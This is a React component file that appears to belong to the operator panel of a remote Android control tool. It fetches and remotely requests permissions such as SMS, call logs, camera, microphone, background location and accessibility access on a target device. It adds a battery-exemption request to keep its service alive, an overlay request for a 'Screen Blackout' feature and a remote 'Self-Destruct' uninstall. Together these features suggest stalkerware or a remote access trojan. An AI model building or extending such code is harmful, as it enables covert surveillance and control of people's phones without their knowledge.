import React, { useState, useCallback } from 'react';

const PERMISSION_LABELS = {
  'android.permission.CAMERA':                              'Camera',
  'android.permission.RECORD_AUDIO':                       'Microphone / Record Audio',
  'android.permission.ACCESS_FINE_LOCATION':               'Fine Location (GPS)',
  'android.permission.ACCESS_COARSE_LOCATION':             'Coarse Location (Network)',
  'android.permission.ACCESS_BACKGROUND_LOCATION':         'Background Location',
  'android.permission.READ_CONTACTS':                      'Read Contacts',
  'android.permission.READ_SMS':                           'Read SMS',
  'android.permission.SEND_SMS':                           'Send SMS',
  'android.permission.RECEIVE_SMS':                        'Receive SMS',
  'android.permission.READ_CALL_LOG':                      'Read Call Logs',
  'android.permission.READ_EXTERNAL_STORAGE':              'Read External Storage',
  'android.permission.WRITE_EXTERNAL_STORAGE':             'Write External Storage',
  'android.permission.READ_MEDIA_IMAGES':                  'Read Media Images',
  'android.permission.READ_MEDIA_VIDEO':                   'Read Media Video',
  'android.permission.READ_MEDIA_AUDIO':                   'Read Media Audio',
  'android.permission.ACCESS_WIFI_STATE':                  'Access WiFi State',
  'android.permission.CHANGE_WIFI_STATE':                  'Change WiFi State',
  'android.permission.VIBRATE':                            'Vibrate',
  'android.permission.WAKE_LOCK':                          'Wake Lock',
  'android.permission.RECEIVE_BOOT_COMPLETED':             'Receive Boot Completed',
  'android.permission.INTERNET':                           'Internet',
  'android.permission.ACCESS_NETWORK_STATE':               'Access Network State',
  'android.permission.FOREGROUND_SERVICE':                 'Foreground Service',
  'android.permission.POST_NOTIFICATIONS':                 'Post Notifications (Android 13+)',
  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS': 'Ignore Battery Optimizations',
  'android.permission.SYSTEM_ALERT_WINDOW':                'Display Over Other Apps (Overlay)',
  'android.permission.BIND_ACCESSIBILITY_SERVICE':         'Accessibility Service',
};

export default function PermissionsTab({ device, sendCommand, results }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [permData, setPermData]           = useState(null);
  const [loading, setLoading]             = useState(false);
  const [requesting, setRequesting]       = useState(null);
  const [status, setStatus]               = useState('');
  const [destructConfirm, setDestructConfirm] = useState(false);
  const [destructDone, setDestructDone]   = useState(false);

  const parsePermissionsFromResults = useCallback((res) => {
    const match = res.find(r => r.command === 'get_permissions' && r.success);
    if (!match) return null;
    try {
      const parsed = typeof match.response === 'string' ? JSON.parse(match.response) : match.response;
      return parsed;
    } catch {
      return null;
    }
  }, []);

  const handleFetchPermissions = () => {
    setLoading(true);
    setStatus('Fetching permissions from device…');
    sendCommand(deviceId, 'get_permissions');
  };

  const handleRequestPermission = (permission) => {
    setRequesting(permission);
    setStatus(`Requesting: ${PERMISSION_LABELS[permission] || permission}`);
    sendCommand(deviceId, 'request_permission', { permission });
    setTimeout(() => {
      setRequesting(null);
      setStatus('Settings opened on device — user can grant the permission.');
    }, 2000);
  };

  const handleRequestAll = () => {
    setStatus('Opening app settings on device for all permissions…');
    sendCommand(deviceId, 'request_all_permissions');
    setTimeout(() => setStatus('App settings opened — user can grant all permissions.'), 2000);
  };

  const handleSelfDestruct = () => {
    if (!destructConfirm) {
      setDestructConfirm(true);
      return;
    }
    sendCommand(deviceId, 'self_destruct', {});
    setDestructDone(true);
    setDestructConfirm(false);
    setStatus('Self-destruct command sent. The app is being removed from the device.');
  };

  const latestPerms = parsePermissionsFromResults(results);
  const displayData = latestPerms || permData;

  if (!loading && latestPerms && permData !== latestPerms) {
    setPermData(latestPerms);
    setLoading(false);
    setStatus('');
  }

  const granted    = displayData?.granted    || [];
  const notGranted = displayData?.notGranted || [];

  return (
    <div className="permissions-tab">
      <div className="perm-header">
        <div>
          <h3 style={{ margin: 0, color: '#a78bfa', fontSize: 16 }}>App Mode</h3>
          <div style={{ fontSize: 12, color: '#64748b', marginTop: 2 }}>
            {displayData
              ? `${granted.length} granted · ${notGranted.length} denied · ${granted.length + notGranted.length} total`
              : 'Fetch permissions to see current status on device'}
          </div>
        </div>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <button
            className="perm-btn perm-btn-fetch"
            onClick={handleFetchPermissions}
            disabled={!isOnline || loading}
          >
            {loading ? '⏳ Fetching…' : '↻ Fetch Permissions'}
          </button>
          {displayData && notGranted.length > 0 && (
            <button
              className="perm-btn perm-btn-req-all"
              onClick={handleRequestAll}
              disabled={!isOnline}
            >
              ⚡ Request All Missing
            </button>
          )}
        </div>
      </div>

      {status && (
        <div className="perm-status-bar">
          {status}
        </div>
      )}

      {!displayData && !loading && (
        <div className="perm-empty">
          <div style={{ fontSize: 40 }}>🛡️</div>
          <div style={{ marginTop: 12, fontSize: 14, color: '#94a3b8' }}>
            Press "Fetch Permissions" to see what permissions the device has granted or denied.
          </div>
        </div>
      )}

      {displayData && (
        <div className="perm-columns">
          <div className="perm-col">
            <div className="perm-col-header perm-col-granted">
              ✅ Granted ({granted.length})
            </div>
            <div className="perm-list">
              {granted.length === 0 && (
                <div className="perm-empty-col">No permissions granted</div>
              )}
              {granted.map((item) => (
                <div key={item.permission} className="perm-item perm-item-granted">
                  <div className="perm-item-icon">✅</div>
                  <div className="perm-item-info">
                    <div className="perm-item-label">{item.label || PERMISSION_LABELS[item.permission] || item.permission}</div>
                    <div className="perm-item-name">{item.permission}</div>
                  </div>
                  <div className="perm-item-badge granted">GRANTED</div>
                </div>
              ))}
            </div>
          </div>

          <div className="perm-col">
            <div className="perm-col-header perm-col-denied">
              ❌ Denied ({notGranted.length})
            </div>
            <div className="perm-list">
              {notGranted.length === 0 && (
                <div className="perm-empty-col">All permissions are granted!</div>
              )}
              {notGranted.map((item) => (
                <div key={item.permission} className="perm-item perm-item-denied">
                  <div className="perm-item-icon">❌</div>
                  <div className="perm-item-info">
                    <div className="perm-item-label">{item.label || PERMISSION_LABELS[item.permission] || item.permission}</div>
                    <div className="perm-item-name">{item.permission}</div>
                  </div>
                  <button
                    className="perm-request-btn"
                    onClick={() => handleRequestPermission(item.permission)}
                    disabled={!isOnline || requesting === item.permission}
                    title="Open settings on device for this permission"
                  >
                    {requesting === item.permission ? '⏳' : '⚡ Request'}
                  </button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ── Special Permissions Section ── */}
      <div style={{ marginTop: 24, padding: '18px 20px', background: 'rgba(124,58,237,0.07)', border: '1px solid rgba(124,58,237,0.25)', borderRadius: 10 }}>
        <div style={{ fontSize: 14, fontWeight: 600, color: '#a78bfa', marginBottom: 4 }}>🔐 Special Permissions</div>
        <div style={{ fontSize: 11, color: '#64748b', marginBottom: 14 }}>
          These permissions require manual user action in Android Settings. Clicking "Request" opens the exact settings page on the device.
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {[
            {
              key: 'storage',
              label: 'File & Storage Access',
              desc: 'Grants access to device files, media, and external storage. Request on-demand from here.',
              icon: '📂',
              command: 'request_storage_permission',
            },
            {
              key: 'battery',
              label: 'Battery Optimization Exemption',
              desc: 'Required so the service keeps running in the background without being killed.',
              icon: '🔋',
              permission: 'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
            },
            {
              key: 'overlay',
              label: 'Display Over Other Apps',
              desc: 'Required for Screen Blackout. Opens the overlay settings for this app.',
              icon: '🪟',
              permission: 'android.permission.SYSTEM_ALERT_WINDOW',
            },
          ].map(sp => (
            <div key={sp.key} style={{ display: 'flex', alignItems: 'center', gap: 12, background: 'rgba(15,15,26,0.5)', borderRadius: 8, padding: '10px 14px' }}>
              <span style={{ fontSize: 22 }}>{sp.icon}</span>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 13, fontWeight: 600, color: '#e2e8f0' }}>{sp.label}</div>
                <div style={{ fontSize: 11, color: '#64748b', marginTop: 2 }}>{sp.desc}</div>
              </div>
              <button
                style={{
                  padding: '6px 14px', borderRadius: 6, border: '1px solid #7c3aed',
                  background: 'rgba(124,58,237,0.15)', color: '#a78bfa',
                  cursor: isOnline ? 'pointer' : 'not-allowed', fontSize: 12, fontWeight: 600,
                  opacity: isOnline ? 1 : 0.5, whiteSpace: 'nowrap',
                }}
                onClick={() => {
                  setStatus(`Requesting ${sp.label} on device…`);
                  if (sp.command) {
                    sendCommand(deviceId, sp.command, {});
                  } else {
                    sendCommand(deviceId, 'request_permission', { permission: sp.permission });
                  }
                  setTimeout(() => setStatus(`${sp.label} requested on device.`), 1800);
                }}
                disabled={!isOnline}
                title={`Open ${sp.label} settings on device`}
              >
                ⚡ Request
              </button>
            </div>
          ))}
        </div>
      </div>

      <div style={{ marginTop: 20, padding: '20px', background: 'rgba(239,68,68,0.06)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 10 }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 12 }}>
          <div>
            <div style={{ fontSize: 14, fontWeight: 600, color: '#ef4444', marginBottom: 4 }}>💣 Destruction</div>
            <div style={{ fontSize: 12, color: '#94a3b8' }}>
              Permanently removes the app from the device. This cannot be undone.
            </div>
          </div>
          <div style={{ display: 'flex', gap: 8 }}>
            {destructConfirm && !destructDone && (
              <button
                style={{ padding: '8px 14px', borderRadius: 6, border: '1px solid #94a3b8', background: 'transparent', color: '#94a3b8', cursor: 'pointer', fontSize: 13 }}
                onClick={() => setDestructConfirm(false)}
              >
                Cancel
              </button>
            )}
            <button
              style={{
                padding: '8px 18px',
                borderRadius: 6,
                background: destructDone ? '#374151' : destructConfirm ? '#dc2626' : 'rgba(239,68,68,0.15)',
                color: destructDone ? '#6b7280' : destructConfirm ? '#fff' : '#ef4444',
                border: `1px solid ${destructDone ? '#374151' : '#ef4444'}`,
                cursor: destructDone || !isOnline ? 'not-allowed' : 'pointer',
                fontWeight: 600,
                fontSize: 13,
              }}
              onClick={handleSelfDestruct}
              disabled={!isOnline || destructDone}
              title={destructConfirm ? 'Click again to confirm — this will uninstall the app!' : 'Self-destruct: uninstall the app from the device'}
            >
              {destructDone ? '✓ Sent' : destructConfirm ? '⚠️ Confirm Self-Destruct' : '💣 Self-Destruct'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
